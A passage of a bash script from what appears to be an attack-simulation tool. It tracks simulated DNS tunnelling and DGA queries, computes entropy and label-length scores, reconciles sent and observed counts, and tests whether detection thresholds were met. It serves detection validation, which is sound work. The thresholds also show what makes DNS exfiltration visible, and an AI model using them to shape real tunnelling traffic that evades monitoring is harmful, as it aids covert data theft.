    baseline=$(probe_dns_server_incoming_queries "${server}" 2>/dev/null || printf '0')
    DNS_SERVER_QUERY_BASELINE=$(safe_int "${baseline}")
}

finalize_dns_server_query_observation() {
    local server="$1" internal_count="$2" actual_count="$3" module="${4:-DNS}"
    local final=0 baseline=0 observed=0 mismatch=no
    server=$(poc_extract_ipv4 "${server}")
    [[ -z "${server}" ]] && return 1
    final=$(probe_dns_server_incoming_queries "${server}" 2>/dev/null || printf '0')
    final=$(safe_int "${final}")
    baseline=$(safe_int "${DNS_SERVER_QUERY_BASELINE:-0}")
    if (( final > 0 && baseline > 0 && final >= baseline )); then
        observed=$((final - baseline))
    else
        observed=0
    fi
    internal_count=$(safe_int "${internal_count}")
    actual_count=$(safe_int "${actual_count}")
    if (( observed > 0 && actual_count > 0 )); then
        if (( observed * 100 / actual_count < 50 || observed * 100 / actual_count > 200 )); then
            mismatch=yes
        fi
    elif (( internal_count > 0 && actual_count > 0 && internal_count != actual_count )); then
        mismatch=yes
    elif (( internal_count > 0 && actual_count == 0 )); then
        mismatch=yes
    fi
    case "${module}" in
        DGA)
            DGA_SERVER_OBSERVED_QUERIES="${observed}"
            DGA_INTERNAL_VS_ACTUAL_MISMATCH="${mismatch}"
            ;;
        DNS_NEW_TLD|NEW_TLD)
            DNS_NEW_TLD_SERVER_OBSERVED_QUERIES="${observed}"
            DNS_NEW_TLD_INTERNAL_MISMATCH="${mismatch}"
            ;;
        *)
            DNS_SERVER_OBSERVED_QUERIES="${observed}"
            DNS_INTERNAL_VS_ACTUAL_MISMATCH="${mismatch}"
            ;;
    esac
    local msg="DNS_QUERY_VERIFICATION module=${module} server=${server} internal_queries=${internal_count} actual_sent=${actual_count} server_observed=${observed} server_baseline=${baseline} server_final=${final} mismatch=${mismatch}"
    state_append "dns_query_verification.log" "${msg}"
    dns_tunnel_log_both "${msg}"
    dga_simulation_log_both "${msg}"
}

reset_dns_query_verification_stats() {
    DNS_QUERY_GENERATED=0
    DNS_QUERY_SENT_COUNT=0
    DNS_QUERY_RESPONDED_COUNT=0
    DNS_TUNNEL_ACTUAL_DNS_QUERIES=0
    DNS_TUNNEL_ACTUAL_TXT_QUERIES=0
    DNS_TUNNEL_ACTUAL_NXDOMAIN=0
    DNS_SERVER_OBSERVED_QUERIES=0
    DNS_INTERNAL_VS_ACTUAL_MISMATCH=no
}

reset_dga_query_verification_stats() {
    DGA_QUERY_GENERATED=0
    DGA_QUERY_SENT_COUNT=0
    DGA_QUERY_RESPONDED_COUNT=0
    DGA_ACTUAL_DNS_QUERIES=0
    DGA_ACTUAL_RANDOM_DOMAINS=0
    DGA_ACTUAL_NXDOMAIN=0
    DGA_SERVER_OBSERVED_QUERIES=0
    DGA_INTERNAL_VS_ACTUAL_MISMATCH=no
}

aggregate_dns_query_verification_from_output() {
    local out="$1" scope="${2:-dns_tunnel}"
    local mod="DNS_TUNNEL"
    [[ "${scope}" == dga ]] && mod="DGA_SIMULATION"
    ingest_remote_events "${out}" "${mod}" || true
    event_sync_legacy_counters_from_sot || true
    [[ -s "${EVENT_DNS_EVENTS:-}" || -s "${EVENT_DGA_EVENTS:-}" ]] && return 0
    return 1
}

apply_dns_actual_counts_for_judgment() {
    local responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
    local sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}")
    local internal=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
    if (( responded > 0 )); then
        DNS_QUERIES_ATTEMPTED="${responded}"
        DNS_RESPONSES_RECEIVED="${responded}"
        DNS_TUNNEL_SUCCESS_COUNT="${responded}"
        (( DNS_TUNNEL_NXDOMAIN_COUNT == 0 && DNS_TUNNEL_ACTUAL_NXDOMAIN > 0 )) && DNS_TUNNEL_NXDOMAIN_COUNT="${DNS_TUNNEL_ACTUAL_NXDOMAIN}"
        (( DNS_TXT_QUERIES == 0 && DNS_TUNNEL_ACTUAL_TXT_QUERIES > 0 )) && DNS_TXT_QUERIES="${DNS_TUNNEL_ACTUAL_TXT_QUERIES}"
    elif (( sent > 0 )); then
        DNS_QUERIES_ATTEMPTED="${sent}"
    fi
    if (( internal > 0 && responded > 0 && internal != responded )); then
        DNS_INTERNAL_VS_ACTUAL_MISMATCH=yes
    fi
}

dns_local_label_ent_score() {
    local lbl="$1" len u sc
    len=${#lbl}
    (( len < 1 )) && { printf '0'; return 0; }
    u=$(printf '%s' "${lbl}" | sed 's/./&\n/g' | sort -u | grep -c . 2>/dev/null || echo 1)
    sc=$(( u * 100 / (len > 32 ? 32 : len) ))
    (( len >= 24 )) && sc=$((sc + 15))
    (( len >= 40 )) && sc=$((sc + 10))
    printf '%s' "${sc}"
}

dns_local_longest_label_len() {
    local fq="$1" best=0 rest="$1" p l
    while [[ -n "${rest}" ]]; do
        p="${rest%%.*}"
        if [[ "${p}" == "${rest}" ]]; then
            rest=""
        else
            rest="${rest#*.}"
        fi
        l=${#p}
        (( l > best )) && best="${l}"
    done
    printf '%s' "${best}"
}

poc_sot_state_dir() {
    if [[ -n "${POC_RUNTIME_DIR:-}" ]]; then
        printf '%s/state' "${POC_RUNTIME_DIR}"
    else
        printf '%s' "${LOCAL_STATE_DIR}"
    fi
}

poc_sot_paths_init() {
    local sdir
    sdir=$(poc_sot_state_dir)
    [[ -n "${sdir}" ]] || return 0
    mkdir -p "${sdir}" 2>/dev/null || true
    event_store_paths_refresh
    if declare -F ensure_event_store_files >/dev/null 2>&1; then
        ensure_event_store_files 2>/dev/null || true
    elif [[ ! -f "${EVENT_DNS_EVENTS:-}" ]]; then
        init_event_store 2>/dev/null || true
    fi
    DNS_GENERATED_DOMAINS_LOG="${sdir}/dns_generated_domains.log"
    DNS_GENERATED_FQDN_KEYS="${sdir}/dns_generated_fqdn.keys"
    HTTP_URL_SCAN_EVENTS_LOG="${EVENT_HTTP_EVENTS:-${sdir}/http_url_scan_events.log}"
}

dns_record_generated_fqdn_memory() {
    local fq="$1" lbl_len=0 ent=0 first_label=""
    case " ${DNS_TUNNEL_GENERATED_FQDN_LIST} " in
        *" ${fq} "*) return 0 ;;
    esac
    DNS_TUNNEL_GENERATED_FQDN_LIST="${DNS_TUNNEL_GENERATED_FQDN_LIST}${fq}"$'\n'
    DNS_TUNNEL_FQDN_COUNT=$((DNS_TUNNEL_FQDN_COUNT + 1))
    DNS_TUNNEL_FQDN_LEN_SUM=$((DNS_TUNNEL_FQDN_LEN_SUM + ${#fq}))
    (( ${#fq} > DNS_TUNNEL_FQDN_LEN_MAX )) && DNS_TUNNEL_FQDN_LEN_MAX=${#fq}
    lbl_len=$(dns_local_longest_label_len "${fq}")
    DNS_TUNNEL_LABEL_LEN_SUM=$((DNS_TUNNEL_LABEL_LEN_SUM + lbl_len))
    (( lbl_len > DNS_TUNNEL_LABEL_LEN_MAX )) && DNS_TUNNEL_LABEL_LEN_MAX="${lbl_len}"
    DNS_TUNNEL_LABEL_COUNT=$((DNS_TUNNEL_LABEL_COUNT + 1))
    first_label="${fq%%.*}"
    ent=$(dns_local_label_ent_score "${first_label}")
    ent=$(safe_int "${ent}")
    DNS_TUNNEL_ENT_SUM=$((DNS_TUNNEL_ENT_SUM + ent))
    DNS_GENERATED_DOMAINS="${DNS_TUNNEL_GENERATED_FQDN_LIST}"
}

dns_record_generated_fqdn() {
    local module="$1" fqdn="$2" qtype="${3:-A}" source="${4:-unknown}"
    local key="" count=0 stage="dns_tunnel_file_client" target="${DNS_TUNNEL_FILE_TARGETS:-${DNS_TARGET_SERVER:-host}}"
    [[ -z "${fqdn}" ]] && return 0
    event_store_paths_refresh
    case "${module}" in
        DNS_TUNNEL) stage="dns_tunnel_file_client" ;;
        *)
            case "${source}" in
                enhanced_chunk|enhanced_chunked) stage="enhanced_chunk" ;;
                *) stage="${source}" ;;
            esac
            ;;
    esac
    record_dns_event "${stage}" "${target}" "query" "${fqdn}" "${qtype}" "sent" "0" "local" "${module}"
    case "${module}" in
        DGA) record_dga_event "${stage}" "${target}" "${fqdn}" "${qtype}" "sent" "0" "local" ;;
        DNS_NEW_TLD)
            local tld="${fqdn##*.}"
            record_new_tld_event "${stage}" "${target}" "${fqdn}" "${tld}" "sent" "0" "local"
            ;;
    esac
    count=$(safe_int "$(event_summary_field "$(build_module_summary_from_events "${module}" 2>/dev/null || true)" unique_fqdn 0)")
    log_message "OK" "DNS_FQDN_RECORDED module=${module} fqdn=${fqdn} qtype=${qtype} source=${source} count=${count}"
}

dns_track_generated_fqdn() {
    dns_record_generated_fqdn "DNS_TUNNEL" "$1" "A" "legacy_track"
}

dns_sync_generated_domains_list() {
    DNS_GENERATED_DOMAINS="${DNS_TUNNEL_GENERATED_FQDN_LIST}"
}

dns_load_generated_domains_from_sot() {
    local module_filter="${1:-DNS_TUNNEL}" log="${DNS_GENERATED_DOMAINS_LOG:-}"
    local line="" mod="" fq="" qtype="" ent=0
    [[ -s "${log}" ]] || return 1
    DNS_TUNNEL_GENERATED_FQDN_LIST=""
    DNS_TUNNEL_FQDN_LEN_SUM=0
    DNS_TUNNEL_FQDN_LEN_MAX=0
    DNS_TUNNEL_FQDN_COUNT=0
    DNS_TUNNEL_LABEL_LEN_SUM=0
    DNS_TUNNEL_LABEL_LEN_MAX=0
    DNS_TUNNEL_LABEL_COUNT=0
    DNS_TUNNEL_ENT_SUM=0
    while IFS= read -r line || [[ -n "${line}" ]]; do
        [[ -z "${line}" ]] && continue
        IFS=$'\t' read -r _ts mod fq qtype _src <<< "${line}"
        [[ -z "${fq}" ]] && continue
        case "${mod}" in
            DNS_TUNNEL|DGA|DNS_NEW_TLD)
                case "${module_filter}" in
                    DNS_TUNNEL)
                        [[ "${mod}" == DNS_TUNNEL ]] || continue
                        ;;
                    DGA)
                        [[ "${mod}" == DGA ]] || continue
                        ;;
                    DNS_NEW_TLD)
                        [[ "${mod}" == DNS_NEW_TLD ]] || continue
                        ;;
                esac
                dns_record_generated_fqdn_memory "${fq}"
                ;;
        esac
    done < "${log}"
    dns_sync_generated_domains_list
    return 0
}

dns_sot_enhanced_fail_fast() {
    local summary="" sent=0 unique=0 ff=""
    event_stage_mark_executed "DNS_TUNNEL" "tunnel_simulator"
    summary=$(build_module_summary_from_events "DNS_TUNNEL" 2>/dev/null || true)
    sent=$(safe_int "$(event_summary_field "${summary}" sent 0)")
    unique=$(safe_int "$(event_summary_field "${summary}" unique_fqdn 0)")
    ff=$(event_fail_fast_invariants "DNS_TUNNEL" "${summary}" "tunnel_simulator" 2>/dev/null || true)
    if [[ "${ff}" == CODE_FAILURE ]]; then
        SCRIPT_ISSUE_FLAGS="${SCRIPT_ISSUE_FLAGS} dns_sot_bug;"
        state_append "dns_server_validation.log" "DNS_SOT_BUG_FAIL_FAST sent=${sent} unique_fqdn=${unique} flags=${EVENT_SOT_FAIL_FAST_FLAGS}"
        return 1
    fi
    return 0
}

dns_refresh_sot_from_generated_domains() {
    local module="${1:-DNS_TUNNEL}" summary=""
    event_store_paths_refresh
    summary=$(build_module_summary_from_events "${module}" 2>/dev/null || true)
    event_sync_legacy_counters_from_sot || true
    log_message "OK" "DNS_SOT_REFRESH source=${EVENT_DNS_EVENTS} module=${module} ${summary}"
}

sync_module_final_summaries_for_validation() {
    event_store_paths_refresh
    dns_refresh_sot_from_generated_domains "DNS_TUNNEL" || true
    http_refresh_sot_from_events || true
    event_sync_legacy_counters_from_sot || true
    log_message "OK" "FAST_SAFE_VALIDATION_SOT ${EVENT_STORE_PATHS}"
}

dns_ingest_generated_fqdns_from_output() {
    local out="$1" line="" fq="" qtype="" source="remote_output"
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        [[ "${line}" != DNS_QUERY_GENERATED* ]] && continue
        fq=$(dns_stats_field_from_line "${line}" fqdn)
        [[ -z "${fq}" ]] && fq=$(dns_stats_field_from_line "${line}" query)
        qtype=$(dns_stats_field_from_line "${line}" qtype)
        [[ -z "${qtype}" ]] && qtype="A"
        [[ "${line}" == *enhanced* ]] && source="enhanced_chunked"
        dns_record_generated_fqdn "DNS_TUNNEL" "${fq}" "${qtype}" "${source}"
    done <<< "$(printf '%s\n' "${out}" | grep -E '^DNS_QUERY_GENERATED' || true)"
}

dns_finalize_entropy_from_generated_list() {
    local sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}") count=$(safe_int "${DNS_TUNNEL_FQDN_COUNT:-0}")
    local ent_avg=0 parsed_entropy=$(safe_int "${DNS_TUNNEL_APPROX_ENTROPY:-0}")
    if (( count < 1 )); then
        return 1
    fi
    ent_avg=$((DNS_TUNNEL_ENT_SUM / count))
    DNS_TUNNEL_APPROX_ENTROPY="${ent_avg}"
    DNS_HIGH_ENTROPY_LABELS="${ent_avg}"
    DNS_TOTAL_ENTROPY_STYLE_COUNT="${ent_avg}"
    if (( sent > 0 && parsed_entropy == 0 && ent_avg == 0 )); then
        SCRIPT_ISSUE_FLAGS="${SCRIPT_ISSUE_FLAGS} dns_stats_bug;"
        dns_tunnel_log_both "DNS_STATS_BUG_DETECTED query_sent=${sent} entropy_score=0 fqdn_tracked=${count} action=recompute_from_generated_list"
        local fq_list="${DNS_TUNNEL_GENERATED_FQDN_LIST}"
        DNS_TUNNEL_GENERATED_FQDN_LIST=""
        DNS_TUNNEL_FQDN_LEN_SUM=0
        DNS_TUNNEL_FQDN_LEN_MAX=0
        DNS_TUNNEL_FQDN_COUNT=0
        DNS_TUNNEL_LABEL_LEN_SUM=0
        DNS_TUNNEL_LABEL_LEN_MAX=0
        DNS_TUNNEL_LABEL_COUNT=0
        DNS_TUNNEL_ENT_SUM=0
        while IFS= read -r fq || [[ -n "${fq}" ]]; do
            [[ -z "${fq}" ]] && continue
            dns_track_generated_fqdn "${fq}"
        done <<< "${fq_list}"
        count=$(safe_int "${DNS_TUNNEL_FQDN_COUNT}")
        (( count > 0 )) && ent_avg=$((DNS_TUNNEL_ENT_SUM / count))
        DNS_TUNNEL_APPROX_ENTROPY="${ent_avg}"
        DNS_HIGH_ENTROPY_LABELS="${ent_avg}"
        DNS_TOTAL_ENTROPY_STYLE_COUNT="${ent_avg}"
    fi
    return 0
}

apply_dga_actual_counts_for_judgment() {
    local responded=$(safe_int "${DGA_QUERY_RESPONDED_COUNT:-0}")
    local sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    local internal=$(safe_int "${DGA_TOTAL_QUERIES:-0}")
    if (( responded > 0 )); then
        DGA_TOTAL_QUERIES="${responded}"
        DGA_NXDOMAIN_COUNT="${DGA_ACTUAL_NXDOMAIN}"
        DGA_QUERIES_ATTEMPTED="${responded}"
        DGA_QUERIES_SENT="${sent}"
    elif (( sent > 0 )); then
        DGA_QUERIES_SENT="${sent}"
    fi
    if (( internal > 0 && responded > 0 && internal != responded )); then
        DGA_INTERNAL_VS_ACTUAL_MISMATCH=yes
    fi
}

dns_pipeline_module_normalize() {
    local module="${1^^}"
    module="${module// /_}"
    module="${module//-/_}"
    printf '%s' "${module}"
}

dns_pipeline_module_counters() {
    local module="$1" gen=0 sent=0 responded=0 internal=0 actual=0 observed=0 mismatch=no
    module=$(dns_pipeline_module_normalize "${module}")
    case "${module}" in
        DNS_TUNNEL)
            gen=$(safe_int "${DNS_QUERY_GENERATED:-0}")
            sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}")
            responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
            internal=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
            actual=$(safe_int "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-0}")
            observed=$(safe_int "${DNS_SERVER_OBSERVED_QUERIES:-0}")
            mismatch="${DNS_INTERNAL_VS_ACTUAL_MISMATCH:-no}"
            ;;
        DGA)
            gen=$(safe_int "${DGA_QUERY_GENERATED:-0}")
            sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
            responded=$(safe_int "${DGA_QUERY_RESPONDED_COUNT:-0}")
            internal=$(safe_int "${DGA_TOTAL_QUERIES:-0}")
            actual=$(safe_int "${DGA_ACTUAL_DNS_QUERIES:-0}")
            observed=$(safe_int "${DGA_SERVER_OBSERVED_QUERIES:-0}")
            mismatch="${DGA_INTERNAL_VS_ACTUAL_MISMATCH:-no}"
            ;;
        DNS_NEW_TLD|NEW_TLD)
            gen=$(safe_int "${DNS_NEW_TLD_GENERATED:-0}")
            sent=$(safe_int "${DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT:-0}")
            responded=$(safe_int "${DNS_NEW_TLD_ACTUAL_DNS_RESPONSES:-0}")
            internal=$(safe_int "${DNS_NEW_TLD_QUERY_COUNT:-0}")
            actual=$(safe_int "${DNS_NEW_TLD_ACTUAL_DNS_RESPONSES:-0}")
            observed=$(safe_int "${DNS_NEW_TLD_SERVER_OBSERVED_QUERIES:-0}")
            mismatch="${DNS_NEW_TLD_INTERNAL_MISMATCH:-no}"
            ;;
        *)
            return 1
            ;;
    esac
    printf '%s %s %s %s %s %s %s' "${gen}" "${sent}" "${responded}" "${internal}" "${actual}" "${observed}" "${mismatch}"
}

dns_pipeline_log_both() {
    local module="$1" msg="$2"
    case "$(dns_pipeline_module_normalize "${module}")" in
        DGA) dga_simulation_log_both "${msg}" ;;
        DNS_NEW_TLD|NEW_TLD) dns_new_tld_log_both "${msg}" ;;
        *) dns_tunnel_log_both "${msg}" ;;
    esac
}

dns_evaluate_pipeline_result() {
    local module="$1" proposed="${2:-}" gen=0 sent=0 responded=0 internal=0 actual=0 observed=0 mismatch=no
    local result="" reason=""
    read -r gen sent responded internal actual observed mismatch <<< "$(dns_pipeline_module_counters "${module}")" || {
        result=FAILED
        reason="unknown_module"
        printf '%s %s' "${result}" "${reason}"
        return 1
    }
    if (( sent < 1 || responded < 1 )); then
        result=FAILED
        if (( sent < 1 )); then
            reason=no_queries_sent
        else
            reason=no_dns_responses
        fi
    elif (( observed < 1 )); then
        result=PARTIAL_SUCCESS
        reason=internal_responses_received_but_not_observed_by_server
    else
        result=SUCCESS
        reason=server_observed_responses
    fi
    if [[ "${result}" == SUCCESS ]] && (( sent < 1 || responded < 1 || observed < 1 )); then
        result=FAILED
        reason=false_success_blocked
    fi
    printf '%s %s' "${result}" "${reason}"
}

dns_pipeline_result_to_stage_label() {
    case "${1}" in
        SUCCESS) printf 'success' ;;
        PARTIAL_SUCCESS) printf 'partial' ;;
        FAILED) printf 'failed' ;;
        *) printf 'failed' ;;
    esac
}

dga_apply_pipeline_to_final_result() {
    local pipeline_result="" pipeline_reason="" stage_label=""
    read -r pipeline_result pipeline_reason <<< "$(dns_evaluate_pipeline_result "DGA")"
    case "${pipeline_result}" in
        FAILED)
            DGA_STAGE_STATUS="Failed"
            DGA_FINAL_RESULT="failed"
            DGA_SKIP_REASON="${pipeline_reason}"
            return 1
            ;;
        PARTIAL_SUCCESS)
            stage_label=$(dns_pipeline_result_to_stage_label "${pipeline_result}")
            DGA_FINAL_RESULT="${stage_label}"
            if [[ "${DGA_STAGE_STATUS}" == Success ]]; then
                DGA_STAGE_STATUS="Partial"
            elif [[ "${DGA_STAGE_STATUS}" != Failed ]]; then
                DGA_STAGE_STATUS="Partial"
            fi
            DGA_SKIP_REASON="${DGA_SKIP_REASON:-${pipeline_reason}}"
            return 0
            ;;
        SUCCESS)
            return 0
            ;;
    esac
    return 0
}

dga_pipeline_allows_success() {
    local pipeline_result="" pipeline_reason=""
    read -r pipeline_result pipeline_reason <<< "$(dns_evaluate_pipeline_result "DGA")"
    [[ "${pipeline_result}" == SUCCESS ]]
}

dns_new_tld_apply_pipeline_to_final_result() {
    local pipeline_result="" pipeline_reason=""
    read -r pipeline_result pipeline_reason <<< "$(dns_evaluate_pipeline_result "DNS_NEW_TLD")"
    case "${pipeline_result}" in
        FAILED)
            DNS_NEW_TLD_STAGE_STATUS="Failed"
            DNS_NEW_TLD_FINAL_RESULT="failed"
            DNS_NEW_TLD_SKIP_REASON="${pipeline_reason}"
            return 1
            ;;
        PARTIAL_SUCCESS)
            if [[ "${DNS_NEW_TLD_STAGE_STATUS}" == Success ]]; then
                DNS_NEW_TLD_STAGE_STATUS="Partial"
                DNS_NEW_TLD_FINAL_RESULT="partial"
            elif [[ "${DNS_NEW_TLD_FINAL_RESULT}" == success ]]; then
                DNS_NEW_TLD_STAGE_STATUS="Partial"
                DNS_NEW_TLD_FINAL_RESULT="partial"
            fi
            DNS_NEW_TLD_SKIP_REASON="${DNS_NEW_TLD_SKIP_REASON:-${pipeline_reason}}"
            return 0
            ;;
        SUCCESS)
            return 0
            ;;
    esac
    return 0
}

log_dns_query_pipeline_summary() {
    local module="$1" result="${2:-n/a}" reason="" reconciled=""
    local gen=0 sent=0 responded=0 internal=0 actual=0 observed=0 mismatch=no
    read -r gen sent responded internal actual observed mismatch <<< "$(dns_pipeline_module_counters "${module}")" || return 1
    read -r reconciled reason <<< "$(dns_evaluate_pipeline_result "${module}" "${result}")"
    case "${reconciled}" in
        SUCCESS|FAILED|PARTIAL_SUCCESS) result="${reconciled}" ;;
    esac
    local msg="DNS_QUERY_PIPELINE_SUMMARY module=${module} query_generated=${gen} query_sent=${sent} query_responded=${responded} internal_queries=${internal} actual_dns_queries=${actual} server_observed=${observed} mismatch=${mismatch} result=${result} reason=${reason}"
    state_append "dns_query_pipeline_summary.log" "${msg}"
    dns_pipeline_log_both "${module}" "${msg}"
}

dns_reconcile_attempted_accounting() {
    local enh fb path_total sim_attempted total responded
    responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
    if (( responded > 0 )); then
        DNS_QUERIES_ATTEMPTED="${responded}"
        DNS_RESPONSES_RECEIVED="${responded}"
        DNS_TUNNEL_SUCCESS_COUNT="${responded}"
        return 0
    fi
    enh=$(safe_int "${DNS_TUNNEL_ENH_ATTEMPTED:-0}")
    fb=$(safe_int "${DNS_TUNNEL_FB_ATTEMPTED:-0}")
    sim_attempted=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
    path_total=$((enh + fb))
    if (( path_total > 0 )); then
        total="${path_total}"
    elif (( sim_attempted > 0 )); then
        total="${sim_attempted}"
    else
        total=0
    fi
    DNS_QUERIES_ATTEMPTED="${total}"
    if (( total == 0 )); then
        DNS_TUNNEL_UNIQUE_QUERIES=0
        DNS_RESPONSES_RECEIVED=0
        DNS_TUNNEL_SUCCESS_COUNT=0
        DNS_TUNNEL_NXDOMAIN_COUNT=0
        DNS_TUNNEL_RESOLVED_COUNT=0
        DNS_TUNNEL_TIMEOUT_COUNT=0
        DNS_TUNNEL_ERROR_COUNT=0
        return 1
    fi
    return 0
}

dns_apply_dry_run_enhanced_synthetic() {
    dns_tunnel_guard_legacy_call "synthetic dns" && return 1
    local planned_count="$1" infra="$2" txt="$3"
    planned_count=$(safe_int "${planned_count}")
    (( planned_count < 1 )) && return 1
    infra=$(safe_int "${infra}")
    txt=$(safe_int "${txt}")
    DNS_TUNNEL_ENH_ATTEMPTED="${planned_count}"
    DNS_TUNNEL_ENH_SUCCESS="${planned_count}"
    DNS_TUNNEL_ENH_FAIL=0
    DNS_TUNNEL_ENH_NX=$((planned_count * 7 / 10))
    DNS_TUNNEL_ENH_TIMEOUT=0
    DNS_TUNNEL_ENH_RESULT="success"
    DNS_TUNNEL_ENH_REASON="dry_run_synthetic"
    DNS_TUNNEL_FB_USED="no"
    DNS_TUNNEL_FB_ATTEMPTED=0
    DNS_TUNNEL_FB_SUCCESS=0
    DNS_TUNNEL_FB_RESULT="skipped"
    DNS_TUNNEL_FB_REASON="enhanced_dry_run"
    DNS_QUERIES_ATTEMPTED="${planned_count}"
    DNS_TUNNEL_UNIQUE_QUERIES="${planned_count}"
    DNS_RESPONSES_RECEIVED="${planned_count}"
    DNS_TUNNEL_SUCCESS_COUNT="${planned_count}"
    DNS_A_QUERIES=$((infra * 2 / 3))
    DNS_TXT_QUERIES=$((infra / 3 + txt))
    DNS_EFFECTIVE_TLD_COUNT="${planned_count}"
    DNS_TOTAL_ENTROPY_STYLE_COUNT=$((planned_count * 30 / 100))
    DNS_TUNNEL_APPROX_ENTROPY="${DNS_TOTAL_ENTROPY_STYLE_COUNT}"
    DNS_TUNNEL_FINAL_RESULT="success"
    DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="enhanced"
    DNS_TUNNEL_FINAL_REASON="dry_run_synthetic"
    DNS_QUERY_GENERATED="${planned_count}"
    DNS_QUERY_SENT_COUNT="${planned_count}"
    DNS_QUERY_RESPONDED_COUNT="${planned_count}"
    DNS_TUNNEL_ACTUAL_DNS_QUERIES="${planned_count}"
    DNS_TUNNEL_ACTUAL_TXT_QUERIES="${txt}"
    DNS_TUNNEL_ACTUAL_NXDOMAIN="${DNS_TUNNEL_ENH_NX}"
    DNS_SENSOR_EXPECTED_VISIBILITY="HIGH"
    dns_reconcile_attempted_accounting || true
    return 0
}

dns_tunnel_meets_detection_success() {
    local entropy=$(safe_int "${DNS_TUNNEL_APPROX_ENTROPY:-0}")
    local unique=$(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES:-0}")
    local sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}")
    local responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
    local fqdn_count=$(safe_int "${DNS_TUNNEL_FQDN_COUNT:-0}")
    local avg_label=0 min_fqdn=0
    local attempted=$(safe_int "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-${responded}}")
    (( attempted < 1 )) && attempted="${sent}"
    local likelihood="${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    dns_refresh_sot_from_generated_domains "DNS_TUNNEL" || true
    fqdn_count=$(safe_int "${DNS_TUNNEL_FQDN_COUNT:-0}")
    entropy=$(safe_int "${DNS_TUNNEL_APPROX_ENTROPY:-0}")
    if (( DNS_TUNNEL_LABEL_COUNT > 0 )); then
        avg_label=$((DNS_TUNNEL_LABEL_LEN_SUM / DNS_TUNNEL_LABEL_COUNT))
    fi
    if (( sent > 0 )); then
        min_fqdn=$((sent * 80 / 100))
    fi
    if (( sent < 150 || responded < 150 )); then
        DNS_TUNNEL_DETECTION_REASON="${DNS_TUNNEL_DETECTION_REASON:-insufficient_query_volume sent=${sent} responded=${responded}}"
        return 1
    fi
    if (( fqdn_count < min_fqdn )); then
        DNS_TUNNEL_DETECTION_REASON="fqdn_sot_below_threshold fqdn_count=${fqdn_count} min=${min_fqdn} sent=${sent}"
        return 1
    fi
    if (( avg_label < 40 )); then
        DNS_TUNNEL_DETECTION_REASON="avg_label_length=${avg_label} below_threshold=40"
        return 1
    fi
    if (( entropy < 1 )); then
        DNS_TUNNEL_DETECTION_REASON="entropy_score=0 insufficient_tunnel_entropy"
        DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
        dns_sot_enhanced_fail_fast || true
        return 1
    fi
    if [[ "${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW}" != HIGH ]]; then
        DNS_TUNNEL_DETECTION_REASON="sensor_expected_visibility=${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW}"
        return 1
    fi
    if [[ "${likelihood}" == LOW ]]; then
        DNS_TUNNEL_DETECTION_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_likelihood=LOW}"
        return 1
    fi
    return 0
}

log_dns_tunnel_final_summary() {
    local result="$1"
    dns_refresh_sot_from_generated_domains || true
    dns_fail_fast_check || true
    dns_validation_consistency_check
    apply_dns_actual_counts_for_judgment
    finalize_dns_server_query_observation "${DNS_TUNNEL_SELECTED_RESOLVER:-${DNS_TARGET_SERVER}}" "${DNS_QUERIES_ATTEMPTED:-0}" "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-${DNS_QUERY_RESPONDED_COUNT:-0}}" "DNS" || true
    log_dns_query_pipeline_summary "DNS_TUNNEL" "${result}"
    read -r _pipeline_result _pipeline_reason <<< "$(dns_evaluate_pipeline_result "DNS_TUNNEL" "${result}")"
    case "${_pipeline_result}" in
        SUCCESS)
            [[ "${result}" == success ]] || result="success"
            ;;
        PARTIAL_SUCCESS)
            result="partial"
            DNS_TUNNEL_SKIP_REASON="${_pipeline_reason}"
            ;;
        FAILED)
            [[ "${result}" == skipped ]] || result="failed"
            DNS_TUNNEL_SKIP_REASON="${_pipeline_reason:-${DNS_TUNNEL_SKIP_REASON}}"
            ;;
    esac
    if ! dns_reconcile_attempted_accounting; then
        [[ "${result}" == skipped || "${DNS_TUNNEL_ENH_RESULT}" == skipped ]] && result="skipped" || result="failed"
        DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
        if (( $(safe_int "${DNS_QUERIES_PLANNED:-0}") > 0 )); then
            poc_log_root_cause_analysis "DNS" "${DNS_TUNNEL_LAST_REMOTE_PAYLOAD:-}" "${DNS_TUNNEL_LAST_REMOTE_OUT:-}"
        fi
    elif [[ "${result}" == success && $(safe_int "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-${DNS_QUERY_RESPONDED_COUNT:-0}}") -lt 1 ]]; then
        result="failed"
        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-zero_actual_dns_responses responded=${DNS_QUERY_RESPONDED_COUNT:-0} internal=${DNS_QUERIES_ATTEMPTED:-0}}"
    elif [[ "${result}" == success && $(safe_int "${DNS_QUERIES_ATTEMPTED}") -lt 1 ]]; then
        result="failed"
    elif [[ "${result}" == success && $(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES}") -lt 1 ]]; then
        result="failed"
        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-unique_queries=0 attempted=${DNS_QUERIES_ATTEMPTED:-0}}"
    elif [[ "${result}" == success ]] && ! dns_tunnel_meets_detection_success; then
        result="partial"
